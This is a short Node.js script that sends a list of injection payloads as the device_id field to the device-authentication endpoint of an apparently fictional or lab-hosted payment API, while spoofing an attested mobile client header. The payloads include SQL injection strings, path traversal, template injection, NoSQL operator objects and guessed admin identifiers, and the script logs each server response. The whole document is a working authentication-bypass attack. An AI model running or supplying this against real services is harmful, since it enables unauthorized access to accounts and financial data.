const https = require("https");
const base = "https://web-f747413d78eddd9f.web.h7tex.com";
const client = "MeridianPay-Android/3.2.1 (attested)";
function post(device_id) {
  const body = JSON.stringify({ device_id });
  return new Promise((resolve) => {
    const request = https.request(base + "/api/v1/auth/device", { method: "POST", headers: { "X-Meridian-Client": client, "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) } }, (response) => {
      let data = ""; response.on("data", (chunk) => data += chunk); response.on("end", () => resolve({ status: response.statusCode, body: data }));
    }); request.on("error", (error) => resolve({ status: "error", body: error.message })); request.end(body);
  });
}
(async () => {
  const values = [
    "' OR '1'='1", "' OR 1=1--", "admin'--", "1001 OR 1=1", "1;SELECT 1", "../admin", "..%2Fadmin", "${admin}", "{{admin}}", "null", "undefined", "[object Object]", "0", "-1", "9999", "1002", "0001", "ADMIN", "Admin", "internal", "service", "system", "root", "staff", "support",
    null, true, false, 0, 1001, [], ["admin"], { "$ne": null }, { "$gt": "" }, { "id": "admin" }, { "device_id": "admin" },
  ];
  for (const value of values) console.log(JSON.stringify({ value, ...(await post(value)) }));
})().catch((error) => { console.error(error); process.exitCode = 1; });
